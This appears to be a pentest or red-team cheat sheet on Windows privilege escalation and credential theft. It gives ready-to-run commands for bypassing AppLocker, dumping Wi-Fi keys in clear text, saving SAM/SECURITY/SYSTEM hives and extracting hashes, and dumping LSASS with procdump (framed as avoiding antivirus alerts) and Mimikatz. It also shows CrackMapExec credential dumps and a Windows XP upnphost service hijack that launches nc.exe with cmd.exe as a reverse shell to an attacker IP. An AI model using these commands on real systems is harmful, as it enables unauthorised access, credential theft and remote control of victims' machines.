# Privilege Escalation

## **Bypass Applocker**

* Bypass cmd/powershell restriction :&#x20;
  * Create a .bat file
  * Use this command :&#x20;
    * cmd.exe /C powershell.exe
* Create a new drive&#x20;
  * C:\Windows\System32\subst.exe H: C:\\&#x20;
    * _Can be run in the explorer windows _
  * Then try to start CMD or POWERSHELL

## **Gather wifi credentials locally**

It is possible to dump the SSID and the password the device has been connected to

* Gather the SSID the workstation has been connected to: `netsh wlan show profiles`
* Get the clear text password associated to the SSID: `netsh wlan show profile name=<SSID> key=clear`
* Export wireless config: `netsh wlan export profile key=clear` will create one .XML file by SSID

## **Dump credentials from Windows**

Dump hashes from the memory or the registry

* Dump hive with `reg.exe`:
  * `C:\WIND0WS\system32>reg.exe save HKLM\SAM <FILE>.hiv`
  * `C:\WIND0WS\system32>reg.exe save HKLM\SECURITY <FILE>.hiv`
  * `C:\WIND0WS\system32>reg.exe save HKLM\SYSTEM <FILE>.hiv`
  * Use SecretDump from Impacket to dump credentials from the hives `sudo /usr/local/bin/secretsdump.py -sam sam.dump -security security.dump -system system.dump LOCAL`
  * Main hives folder location :
    * `HKEY_LOCAL_MACHINE\SYSTEM` : `%windir%\system32\config\SYSTEM`
    * `HKEY_LOCAL_MACHINE\SAM` : `%windir%\system32\config\SAM`
    * `HKEY_LOCAL_MACHINE\SECURITY` : `%windir%\system32\config\SECURITY`
    * `HKEY_LOCAL_MACHINE\SOFTWARE` : `%windir%\system32\config\SOFTWARE`
    * `HKEY_USERS\.DEFAULT` : `%windir%\system32\config\DEFAULT`
      * Open regedit.exe - clic on HKLM - clic on the menu `file` - `load hive` - named the key
      * Once the hive loaded on the editor, dump it : `reg.exe save "HIVE\CLE" DUMPFILE.HIV`
* Dump LSASS.EXE process:
  * Procdump
    * Microsoft tool, more discreet, will not rise an antivirus alert. Should always be used in the a RedTeal context.
    * `procdump.exe -accepteula -ma LSASS.EXE <DUMP_FILE>`
    * The dump output file need to be openend with `Mimikatz` from a Windows workstation or virtual machine compatible (version and architecture) with the targeted workstation.
    * Use `sekurlsa::minidump <DUMP_FILE>` to switch in the LSASS context of the dumped file then you use the usual command of `Mimikatz` to dump credentials.
  * Mimikatz
    * Use `sekurlsa::logonPasswords full` to enumerate all possible credentials with one command
      * Check for `sekurlsa::wdigest` or `sekurlsa::credman` for clear text password (Windows < 8.1), `sekurlsa::msv` for LM & NTLM hashes
  * Meterpreter
    * `hashdump` to dump local SAM database
    * `load mimikatz` then `mimikatz_command -f sekurlsa::logonPasswords full`
* Through SMB with CME:
  * SAM : `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD' -d <DOMAIN> --sam`
  * LSA : `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD' -d <DOMAIN> --lsa`
  * Mimikatz through CME: `crackmapexec smb <IP> '<USERNAME>' -p '<PASSWORD' -d <DOMAIN> --mimikatz-cmd "sekurlsa::logonPasswords full"`
* Windows Credential Editor : WiP
  * WCE can allow you to load hashes you dump from the memory of a target workstation on your Windows VM. Thereby if you dump credentials from a target workstation of a user that can not connect with RDP you will be able to have his user context in your VM by loading its hashes in memory.

## **Windows XP upnphost service**

* On SP0 and SP1 the upnphost service can be used to escalate privileges
* Use accesschk **version 5.1**
* Set **BINARY mode** when you download it with FTP : `ftp 10.11.1.13` then `binary`
* `accesschk-2003-xp.exe /accepteula`
* `accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula`
* `aaccesschk-2003-xp.exe -ucqv upnphost /accepteula`
* `sc qc upnphost`
* Upload nc.exe on the target via **FTP using binary mode**
* Modify the configuration of the upnphost service

```
C:\Inetpub\wwwroot>sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe <IP> 9999 -e c:\Windows\system32\cmd.exe"
C:\Inetpub\wwwroot>sc config upnphost obj= ".\LocalSystem" password= ""
C:\Inetpub\wwwroot>sc config upnphost depend= ""
C:\Inetpub\wwwroot>net start upnphost
```

****
